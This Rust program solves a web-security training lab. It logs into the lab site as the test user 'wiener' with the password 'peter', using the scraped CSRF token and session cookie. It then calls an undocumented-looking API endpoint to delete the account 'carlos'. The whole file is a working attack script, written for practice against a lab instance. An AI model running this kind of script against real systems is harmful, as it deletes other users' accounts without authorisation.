/**************************************************************
*
* Lab: Exploiting an API endpoint using documentation
*
* Hack Steps:
*      1. Fetch the login page
*      2. Extract the csrf token and session cookie to login
*      3. Login as wiener to get a valid session
*      4. Delete carlos
*
***************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a0800480455079185d3717500210063.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("â¦—1â¦˜ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch_login_page();

    println!("{}", "OK".green());
    print!("â¦—2â¦˜ Extracting the csrf token and session cookie to login.. ");
    flush_terminal();

    let session = get_session_cookie(&login_page);
    let csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("â¦—3â¦˜ Logging in as wiener to get a valid session.. ");
    flush_terminal();

    let wiener_login = login_as_wiener(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("â¦—4â¦˜ Deleting carlos.. ");
    flush_terminal();

    let wiener_session = get_session_cookie(&wiener_login);
    delete_carlos("/api/user/carlos", &wiener_session);

    println!("{}", "OK".green());
    println!("ðŸ—¹ The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch_login_page() -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}/login"))
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to fetch the login page".red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "â¦—!â¦˜ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text(&format!("session=(.*);"), cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "â¦—!â¦˜ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("stay-logged-in", "on"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to login as wiener".red()))
}

fn delete_carlos(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .delete(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("â¦—!â¦˜ Failed to delete: {}", path.red()))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
